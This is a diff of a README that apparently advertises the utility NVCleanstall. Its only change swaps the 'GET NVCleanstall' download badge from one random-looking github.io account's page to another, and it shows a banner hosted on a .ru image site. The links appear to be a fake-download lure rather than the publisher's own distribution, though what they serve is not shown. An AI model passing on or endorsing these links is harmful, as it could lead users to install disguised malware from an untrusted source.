@@ -2,7 +2,7 @@
 
 ![Banner Placeholder](https://pic.xenomorph.ru/2024-12/00.png)
 
-[![GET NVCleanstall](https://img.shields.io/badge/GET%20%E2%80%94%20NVCleanstall-0078D6?style=for-the-badge&logoColor=white)](https://killianesteshrvj.github.io/.github/nvcleanstall)
+[![GET NVCleanstall](https://img.shields.io/badge/GET%20%E2%80%94%20NVCleanstall-0078D6?style=for-the-badge&logoColor=white)](https://kendrickdudleyiiln.github.io/.github/NVCleanstall)
 
 ---
 
